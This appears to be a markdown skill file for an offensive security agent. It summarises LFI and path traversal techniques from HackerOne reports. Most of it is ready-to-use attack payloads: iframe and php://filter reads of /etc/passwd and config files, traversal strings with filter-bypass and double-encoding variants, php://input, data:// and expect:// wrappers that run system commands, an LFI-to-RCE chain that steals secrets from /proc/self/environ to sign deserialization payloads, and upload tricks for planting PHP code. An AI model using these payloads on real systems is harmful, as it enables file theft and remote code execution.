---
name: "h1-lfi-traversal-techniques"
description: "Local File Inclusion and Path Traversal patterns from HackerOne reports — PDF generator iframe LFI, markdown image traversal → RCE chain, Java URL protocol LFI, docroot traversal"
category: web-security
tags: ["lfi", "path-traversal", "file-inclusion", "rce-chain", "hackerone"]
relevance: 10
---

# H1 LFI & Path Traversal Techniques

Real-world LFI vulnerabilities with $500-$20000 bounties:

## 1. PDF Generator LFI
Report: Visma PDF-generator iframe LFI ($500)
- Technique: Inject `<iframe>` with `file://` or `php://` wrapper
- Payload: `<iframe src=file:///etc/passwd height=500 width=500></iframe>`
- Payload: `<iframe src=php://filter/convert.base64-encode/resource=index.php></iframe>`
- Test: HTML-to-PDF converters, report generators, invoice PDFs

## 2. LFI → RCE Chain (CRITICAL)
Report: GitLab LFI through Path Traversal → RCE via deserialization ($20000)
1. Find LFI in markdown image tag: `![](../../../../proc/self/environ)`
2. Read secret from `/proc/self/environ` or config files
3. Use secret to sign malicious deserialized payload
4. Trigger deserialization RCE

## 3. Java URL Protocol LFI
Report: GitHub Security Lab Java URL LFI ($1800)
- Technique: Java's `openStream()` accepts `file://` and `jar://` protocols
- Payload: `file:///etc/passwd`
- Payload: `jar:file:///path/to/jar!/internal/file`

## 4. Path Traversal via URI Misconfiguration
Report: Starbucks docroot path traversal ($500)
- Payload: `../../../../etc/passwd`
- Payload: `....//....//....//etc/passwd` (filter bypass)
- Payload: `..%252f..%252f..%252fetc/passwd` (double URL encode)

## 5. PHP Wrappers LFI
For PHP targets, test these wrappers:
```
php://filter/convert.base64-encode/resource=config.php
php://input (with POST: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==
expect://id
```

## 6. LFI via File Upload
- Upload PHP file as image (GIF89a header + PHP code)
- Upload SVG with PHP extension
- Upload .htaccess override

## Key Parameters:
`file`, `page`, `template`, `include`, `path`, `doc`, `document`, `folder`, `root`, `load`, `read`, `style`, `pdf`, `invoice`, `report`
